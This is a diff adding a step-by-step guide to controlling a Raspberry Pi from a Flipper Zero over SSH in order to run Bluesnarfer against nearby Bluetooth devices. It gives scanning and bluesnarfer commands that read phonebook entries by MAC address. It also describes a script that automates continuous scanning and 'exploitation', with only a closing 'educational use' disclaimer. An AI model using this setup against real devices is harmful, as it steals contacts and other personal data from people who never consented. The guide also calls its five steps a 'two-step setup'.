@@ -1,0 +1,77 @@
+ Flipper Zero as a Remote Controller for Raspberry Pi
+Step 1: Set up SSH on Raspberry Pi
+
+1.1 Enable SSH
+Make sure SSH is enabled on the Raspberry Pi by running:
+
+
+sudo systemctl enable ssh
+sudo systemctl start ssh
+
+1.2 Get the Raspberry Pi IP Address
+Find the Pi’s IP address so you can connect to it via SSH:
+
+
+hostname -I
+
+Note down the IP address for later use.
+Step 2: Set up Wi-Fi and SSH on Flipper Zero
+
+2.1 Install Wi-Fi Module
+If you have a Wi-Fi SD card or dongle for your Flipper Zero, install it and connect to the same Wi-Fi network as the Raspberry Pi.
+
+2.2 Install SSH Client
+Download and install the Flipper Zero SSH client from FlipperZero-Touch-SSH GitHub or a similar repository. Use the qFlipper app to transfer the SSH app to your Flipper Zero.
+
+2.3 Connect to Raspberry Pi via SSH
+Open the SSH app on the Flipper Zero and connect to the Raspberry Pi using the following command:
+
+
+
+ssh pi@<Raspberry_Pi_IP>
+
+Replace <Raspberry_Pi_IP> with the IP address you noted earlier. Enter the Raspberry Pi password when prompted.
+Step 3: Control Raspberry Pi Remotely Using Flipper Zero
+
+3.1 Trigger the Python Script
+Once logged into the Raspberry Pi via SSH on the Flipper Zero, you can run the Bluesnarfer automation script or any other command:
+
+
+
+python3 bluesnarf_auto.py
+
+3.2 Manual Control
+You can manually issue commands from the Flipper Zero, such as:
+
+    Scanning for Bluetooth devices:
+
+
+
+sudo hcitool scan
+
+Running Bluesnarfer:
+
+
+
+    ./bluesnarfer -b <MAC_ADDRESS> -r 1-10
+
+Step 4: Use Flipper Zero as a Bluetooth Scanner
+
+4.1 Option: Flipper Zero as Bluetooth Scanner
+If you prefer to use the Flipper Zero to scan for nearby Bluetooth devices and send the MAC addresses to the Raspberry Pi, you can:
+
+    Scan using the Flipper’s built-in Bluetooth module.
+    Forward the MAC addresses to the Raspberry Pi via SSH or Wi-Fi.
+
+Step 5: Running the Project
+
+    Run the Python Script on the Raspberry Pi to automate Bluetooth device scanning and blue snarfing.
+    Use Flipper Zero to control the process remotely via SSH, or use it to scan for devices and send information to the Pi.
+
+Final Considerations
+
+    Educational Use Only: Bluesnarfer exploits vulnerabilities in Bluetooth devices and should only be used in controlled environments with explicit permission.
+    Automation Benefits: The Python script automates scanning and attacks, making it efficient for continuous Bluetooth device monitoring and exploitation.
+    Flipper Zero Integration: Flipper Zero provides flexibility by allowing remote control, making the setup more versatile and interactive.
+
+With this two-step setup, you can now control your Raspberry Pi remotely with the Flipper Zero, automate Bluetooth scanning and exploitation with Bluesnarfer, and integrate the Flipper Zero as a Bluetooth scanner or remote controller for your Raspberry Pi.
